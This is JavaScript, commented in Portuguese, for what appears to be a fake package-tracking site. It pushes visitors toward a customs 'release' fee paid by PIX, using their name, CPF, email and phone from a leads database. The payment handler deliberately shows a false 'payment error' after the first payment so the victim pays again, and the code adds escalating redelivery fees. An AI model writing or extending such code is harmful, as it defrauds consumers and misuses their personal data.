    updateElement(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = value;
        }
    }

    showElement(id) {
        const element = document.getElementById(id);
        if (element) {
            element.style.display = 'block';
        }
    }

    getFirstAndLastName(fullName) {
        if (!fullName) return 'Nome não informado';
        const names = fullName.trim().split(' ');
        if (names.length === 1) return names[0];
        return `${names[0]} ${names[names.length - 1]}`;
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            // Scroll com pausa nos "Dados do Pedido" e depois para o botão
            this.smoothScrollToLiberationButton();
        }
    }
    
    highlightAndScrollToLiberationButton() {
        console.log('🎯 Iniciando destaque e scroll para botão de liberação...');
        
        // Primeiro, scroll para "Dados do Pedido" com pausa
        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            console.log('📋 Fazendo scroll para Dados do Pedido...');
            orderDetails.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Pausa de 1.5 segundos nos Dados do Pedido
            setTimeout(() => {
                console.log('⏸️ Pausa nos Dados do Pedido concluída, continuando para o botão...');
                this.scrollToLiberationButtonFinal();
            }, 1500);
        } else {
            // Se não encontrar Dados do Pedido, ir direto para o botão
            this.scrollToLiberationButtonFinal();
        }
    }
    
    smoothScrollToLiberationButton() {
        console.log('🎯 Iniciando scroll suave para botão de liberação...');
        
        // Primeiro, scroll para "Dados do Pedido" com pausa
        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            console.log('📋 Fazendo scroll para Dados do Pedido...');
            orderDetails.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Pausa de 1.5 segundos nos Dados do Pedido
            setTimeout(() => {
                console.log('⏸️ Pausa nos Dados do Pedido concluída, continuando para o botão...');
                this.scrollToLiberationButtonFinal();
            }, 1500);
        } else {
            // Se não encontrar Dados do Pedido, ir direto para o botão
            this.scrollToLiberationButtonFinal();
        }
    }
    
    scrollToLiberationButtonFinal() {
        setTimeout(() => {
            const liberationButton = document.querySelector('.liberation-button-timeline:last-of-type');
            
            if (liberationButton) {
                console.log('✅ Botão LIBERAR PACOTE encontrado, fazendo scroll final...');
                
                // Scroll suave para o botão
                liberationButton.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
                
                // Aplicar efeito de destaque
                liberationButton.style.animation = 'liberationHighlight 3s ease-in-out';
                
                // Depois do destaque, manter pulsação sutil
                setTimeout(() => {
                    liberationButton.style.animation = 'liberationPulse 2s infinite';
                }, 3000);
            } else {
                console.error('❌ Botão LIBERAR PACOTE não encontrado no DOM');
            }
        }, 500);
    }

    async openLiberationModal() {
        console.log('🔓 ABRINDO MODAL DE LIBERAÇÃO ADUANEIRA...');
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            console.log('✅ Modal de liberação exibido');
            
            // Tentar gerar PIX via Zentra Pay primeiro
            await this.generatePixForLiberation();
        } else {
            console.error('❌ Modal de liberação não encontrado no DOM');
        }
    }

    async generatePixForLiberation() {
        try {
            console.log('💳 GERANDO PIX PARA LIBERAÇÃO ADUANEIRA...');
            console.log('📦 Dados do lead para PIX:', {
                nome: this.leadData?.nome_completo,
                cpf: this.leadData?.cpf,
                email: this.leadData?.email,
                telefone: this.leadData?.telefone
            });
            
            // Se já temos dados do PIX (retry), reutilizar
            if (this.currentPixData) {
                console.log('🔄 Reutilizando dados do PIX existente');
                this.updatePixModalWithData(this.currentPixData);
                return;
            }
            
            // Usar dados do lead do banco de dados
            const userData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };
            
            const pixResult = await this.zentraPayService.createPixTransaction(userData, 26.34);
            
            if (pixResult.success) {
                console.log('🎉 PIX GERADO COM SUCESSO VIA ZENTRA PAY!');
                console.log('📋 PIX Payload:', pixResult.pixPayload?.substring(0, 50) + '...');
                
                // Armazenar dados para possível retry
                this.currentPixData = {
                    pixPayload: pixResult.pixPayload,
                    qrCode: pixResult.qrCode
                };
                
                // Atualizar QR Code e código PIX no modal
                const qrCodeImg = document.getElementById('realPixQrCode');
                const pixCodeInput = document.getElementById('pixCodeModal');
                
                if (qrCodeImg && pixResult.pixPayload) {
                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
                    console.log('🖼️ QR CODE ATUALIZADO COM PIX REAL');
                }
                
                if (pixCodeInput && pixResult.pixPayload) {
                    pixCodeInput.value = pixResult.pixPayload;
                    console.log('📋 CÓDIGO PIX ATUALIZADO NO MODAL');
                }
                
                this.pixData = pixResult;
            } else {
                throw new Error(pixResult.error || 'Erro ao gerar PIX');
            }
            
        } catch (error) {
            console.warn('⚠️ ERRO AO GERAR PIX VIA API, USANDO LINK DIRETO ZENTRA PAY:', error);
            // Fallback: Adicionar link direto do Zentra Pay
            this.addZentraPayDirectLink();
        }
    }
    
    addZentraPayDirectLink() {
        const pixSection = document.querySelector('.professional-pix-section');
        if (pixSection) {
            // Verificar se o link já existe
            const existingLink = pixSection.querySelector('.zentra-pay-direct-link');
            if (existingLink) return;
            
            console.log('🔗 ADICIONANDO LINK DIRETO ZENTRA PAY');
            
            // Criar link direto
            const linkContainer = document.createElement('div');
            linkContainer.style.cssText = `
                text-align: center;
                margin-top: 20px;
                padding-top: 20px;
                border-top: 1px solid #e9ecef;
            `;
            
            linkContainer.innerHTML = `
                <a href="https://checkout.zentrapaybr.com/UlCGsjOn"
                   target="_blank" 
                   class="zentra-pay-direct-link"
                   style="
                       background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
                       color: white;
                       text-decoration: none;
                       padding: 12px 25px;
                       border-radius: 8px;
                       font-weight: 600;
                       display: inline-flex;
                       align-items: center;
                       gap: 8px;
                       transition: all 0.3s ease;
                       box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
                       animation: pulse 2s infinite;
                   ">
                    <i class="fas fa-external-link-alt"></i>
                    Pagar via Zentra Pay (Link Direto)
                </a>
                <p style="
                    margin-top: 10px;
                    font-size: 0.9rem;
                    color: #666;
                    font-style: italic;
                ">
                    Taxa de R$ 26,34 já configurada no checkout
                </p>
            `;
            
            pixSection.appendChild(linkContainer);
            console.log('✅ LINK DIRETO ZENTRA PAY ADICIONADO COMO FALLBACK');
        }
    }

    openDeliveryModal(attemptNumber, value) {
        console.log(`Abrindo modal de entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
        
        const modal = document.getElementById('deliveryModal');
        const feeValue = document.getElementById('deliveryFeeValue');
        const deliveryTime = document.getElementById('deliveryTime');
        
        if (modal) {
            modal.style.display = 'flex';
        }
        
        if (feeValue) {
            feeValue.textContent = `R$ ${value.toFixed(2)}`;
        }
        
        if (deliveryTime) {
            const times = ['05:30', '14:20', '09:45', '16:10'];
            deliveryTime.textContent = times[attemptNumber - 1] || '05:30';
        }
        
        // Gerar PIX para entrega
        this.generatePixForDelivery(value, attemptNumber);
    }

    async generatePixForDelivery(value, attemptNumber) {
        try {
            console.log(`Gerando PIX para entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
            
            const pixData = await this.zentraPayService.generatePix(value, `Taxa de Reentrega - ${attemptNumber}ª Tentativa`);
            
            if (pixData && pixData.pix && pixData.pix.payload) {
                const pixCodeInput = document.getElementById('pixCodeDelivery');
                if (pixCodeInput) {
                    pixCodeInput.value = pixData.pix.payload;
                }
                
                console.log('✅ PIX de entrega gerado via API');
            }
        } catch (error) {
            console.warn('⚠️ Erro ao gerar PIX de entrega:', error);
        }
    }

    // Mostrar modal de liberação
    showLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('📋 Modal de liberação exibido');
        }
    }
    
    // Fechar modal de liberação
    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
            console.log('📋 Modal de liberação fechado');
        }
    }
    
    // Processar pagamento bem-sucedido
    processSuccessfulPayment() {
        console.log('✅ Processando pagamento bem-sucedido...');
        
        // Verificar se é o primeiro ou segundo pagamento
        const isFirstPayment = !this.hasAttemptedPayment;
        
        if (isFirstPayment) {
            console.log('💳 Primeiro pagamento - simulando erro');
            this.hasAttemptedPayment = true;
            
            // Fechar modal de pagamento
            this.closeLiberationModal();
            
            // Mostrar popup de erro após pequeno delay
            setTimeout(() => {
                this.showPaymentErrorPopup();
            }, 500);
            
            return;
        }
        
        console.log('✅ Segundo pagamento - processando sucesso');
        
        // Ocultar botão LIBERAR PACOTE
        this.hideLiberationButton();
        
        // Fechar modal de liberação
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
        
        // Mostrar notificação de sucesso
        this.showPaymentSuccessNotification();
        
        if (this.leadData) {
            // Atualizar status de pagamento
            this.leadData.status_pagamento = 'pago';
            this.leadData.etapa_atual = Math.max(this.leadData.etapa_atual, 12);
            
            // Salvar no banco de dados
            this.dbService.updatePaymentStatus(this.leadData.cpf, 'pago');
            this.dbService.updateLeadStage(this.leadData.cpf, 12);
            
            // Regenerar dados de rastreamento
            this.generateRealTrackingData();
            this.displayTrackingResults();
            this.saveTrackingData();
            
            console.log('✅ Pagamento processado, etapas atualizadas');
        }
        
        // Scroll suave para a próxima etapa após 3 segundos
        setTimeout(() => {
            const nextStep = document.querySelector('.timeline-item.last');
            if (nextStep) {
                nextStep.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
            }
        }, 3000);
    }
    
    showPaymentErrorPopup() {
        console.log('❌ Exibindo popup de erro de pagamento');
        
        const errorPopup = document.createElement('div');
        errorPopup.id = 'paymentErrorPopup';
        errorPopup.className = 'modal-overlay';
        errorPopup.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;
        
        errorPopup.innerHTML = `
            <div class="error-popup-container" style="
                background: white;
                border-radius: 20px;
                max-width: 400px;
                width: 85%;
                padding: 40px;
                text-align: center;
                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                animation: slideUp 0.4s ease;
                position: relative;
                border: 3px solid #e74c3c;
            ">
                <div class="error-icon" style="
                    font-size: 3.5rem;
                    color: #e74c3c;
                    margin-bottom: 20px;
                    animation: bounceIn 0.6s ease;
                ">
                    <i class="fas fa-exclamation-triangle"></i>
                </div>
                <h2 style="
                    font-size: 1.6rem;
                    font-weight: 700;
                    color: #2c3e50;
                    margin-bottom: 15px;
                ">
                    Erro ao processar o pagamento
                </h2>
                <p style="
                    color: #666;
                    font-size: 1rem;
                    line-height: 1.6;
                    margin-bottom: 25px;
                ">
                    Ocorreu um problema ao processar seu pagamento. Tente novamente.
                </p>
                <button id="retryPaymentButton" style="
                    background: linear-gradient(45deg, #e74c3c, #c0392b);
                    color: white;
                    border: none;
                    padding: 15px 30px;
                    font-size: 1rem;
                    font-weight: 700;
                    border-radius: 8px;
                    cursor: pointer;
                    transition: all 0.3s ease;
                    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                ">
                    <i class="fas fa-redo"></i> Tentar Novamente
                </button>
            </div>
        `;
        
        document.body.appendChild(errorPopup);
        document.body.style.overflow = 'hidden';
        
        // Configurar evento do botão
        const retryButton = errorPopup.querySelector('#retryPaymentButton');
        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorPopup();
                // Reabrir modal de pagamento com os mesmos dados
                setTimeout(() => {
                    this.showLiberationModal();
                }, 300);
            });
        }
        
        // Fechar ao clicar fora
        errorPopup.addEventListener('click', (e) => {
            if (e.target === errorPopup) {
                this.closePaymentErrorPopup();
            }
        });
    }
    
    closePaymentErrorPopup() {
        const errorPopup = document.getElementById('paymentErrorPopup');
        if (errorPopup) {
            errorPopup.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorPopup.parentNode) {
                    errorPopup.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }
    
    // Ocultar botão LIBERAR PACOTE após pagamento confirmado
    hideLiberationButton() {
        const liberationButtons = document.querySelectorAll('.liberation-button-timeline');
        liberationButtons.forEach(button => {
            if (button) {
                button.style.display = 'none';
                console.log('🔒 Botão LIBERAR PACOTE ocultado após pagamento confirmado');
            }
        });
    }
    
    showPaymentError() {
        // Criar notificação de erro
        const errorNotification = document.createElement('div');
        errorNotification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #e74c3c;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
            z-index: 4000;
            animation: slideInRight 0.3s ease;
            max-width: 300px;
        `;
        
        errorNotification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-exclamation-triangle"></i>
                <div>
                    <strong>Erro no Pagamento</strong>
                    <div style="font-size: 0.9rem; margin-top: 5px;">
                        Ocorreu um erro ao processar o pagamento. Tente novamente.
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(errorNotification);
        
        // Remover após 4 segundos
        setTimeout(() => {
            errorNotification.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => {
                if (errorNotification.parentNode) {
                    errorNotification.remove();
                }
            }, 300);
        }, 4000);
    }
    
    addRetryButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (modalContent) {
            // Verificar se já existe
            const existingRetry = modalContent.querySelector('.retry-payment-button');
            if (existingRetry) return;
            
            const retryContainer = document.createElement('div');
            retryContainer.style.cssText = `
                text-align: center;
                margin-top: 20px;
                padding-top: 20px;
                border-top: 1px solid #e9ecef;
            `;
            
            retryContainer.innerHTML = `
                <button class="retry-payment-button" style="
                    background: #f39c12;
                    color: white;
                    border: none;
                    padding: 12px 25px;
                    border-radius: 8px;
                    cursor: pointer;
                    font-weight: 600;
                    transition: all 0.3s ease;
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                ">
                    <i class="fas fa-redo"></i> Tentar Novamente
                </button>
            `;
            
            modalContent.appendChild(retryContainer);
            
            // Configurar evento
            const retryButton = retryContainer.querySelector('.retry-payment-button');
            if (retryButton) {
                retryButton.addEventListener('click', () => {
                    // Resetar botão de simulação
                    const simulateButton = document.getElementById('simulatePaymentButton');
                    if (simulateButton) {
                        simulateButton.removeAttribute('data-retry');
                        simulateButton.textContent = 'SIMULAÇÃO DE PAGAMENTO';
                        simulateButton.style.background = 'transparent';
                    }
                    
                    // Remover botão de retry
                    retryContainer.remove();
                });
            }
        }
    }

    // Scroll automático com pausa nos dados do pedido
    async performGuidedScroll() {
        console.log('🎯 Iniciando scroll guiado para botão de liberação');
        
        // Primeiro: scroll para dados do pedido
        const orderDetails = document.getElementById('orderDetails');
        if (orderDetails) {
            console.log('📋 Scrolling para Dados do Pedido...');
            orderDetails.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Destacar dados do pedido brevemente
            orderDetails.style.background = 'rgba(30, 74, 107, 0.1)';
            orderDetails.style.borderRadius = '10px';
            orderDetails.style.transition = 'all 0.3s ease';
            
            // Pausa de 1.5 segundos
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Remover destaque
            orderDetails.style.background = '';
        }
        
        // Depois: scroll para botão de liberação
        const liberationButton = document.querySelector('.liberation-button-timeline:last-of-type');
        if (liberationButton) {
            console.log('🔓 Scrolling para botão LIBERAR PACOTE...');
            liberationButton.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });
            
            // Aguardar scroll completar
            await new Promise(resolve => setTimeout(resolve, 800));
            
            // Destacar botão por 3 segundos
            this.highlightLiberationButtonWithPulse(liberationButton);
        }
    }
    
    highlightLiberationButtonWithPulse(button) {
        console.log('✨ Destacando botão com pulsação');
        
        // Adicionar classe de destaque
        button.classList.add('highlighted-button');
        
        // Remover destaque após 3 segundos, mas manter pulsação
        setTimeout(() => {
            button.classList.remove('highlighted-button');
        }, 3000);
    }

    showPaymentSuccessNotification() {
        // Criar notificação de sucesso
        const successNotification = document.createElement('div');
        successNotification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 4000;
            animation: slideInRight 0.3s ease;
            max-width: 300px;
        `;
        
        successNotification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-check-circle"></i>
                <div>
                    <strong>Pagamento Confirmado!</strong>
                    <div style="font-size: 0.9rem; margin-top: 5px;">
                        Seu pacote foi liberado com sucesso.
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(successNotification);
        
        // Remover após 5 segundos
        setTimeout(() => {
            successNotification.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => {
                if (successNotification.parentNode) {
                    successNotification.remove();
                }
            }, 300);
        }, 5000);
    }

    showError(message) {
        UIHelpers.showError(message);
    }

    showCPFNotFoundError() {
        this.showError('CPF não encontrado no sistema. Verifique se o CPF está correto.');
    }
}